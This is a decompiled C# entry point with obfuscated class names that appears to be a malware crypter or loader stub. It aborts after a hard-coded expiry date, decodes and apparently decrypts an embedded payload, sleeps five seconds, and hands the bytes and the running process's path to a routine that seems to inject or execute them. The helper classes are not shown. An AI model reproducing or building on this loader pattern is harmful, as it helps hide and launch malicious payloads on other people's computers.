using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

public class GClass5
{
	[STAThread]
	public static void Main(string[] args)
	{
		if (DateTime.Now > new DateTime(635293720746953418L))
		{
			throw new Exception();
		}
		string string_ = Conversions.ToString(GClass1.smethod_0());
		string_ = GClass0.smethod_1(string_);
		byte[] byte_ = GClass0.smethod_0(string_);
		byte_ = GClass3.smethod_0(byte_);
		Application.DoEvents();
		Thread.Sleep(5000);
		GClass4 gClass = new GClass4();
		gClass.method_2(byte_, Process.GetCurrentProcess().MainModule!.FileName);
		GClass0.smethod_2();
	}
}
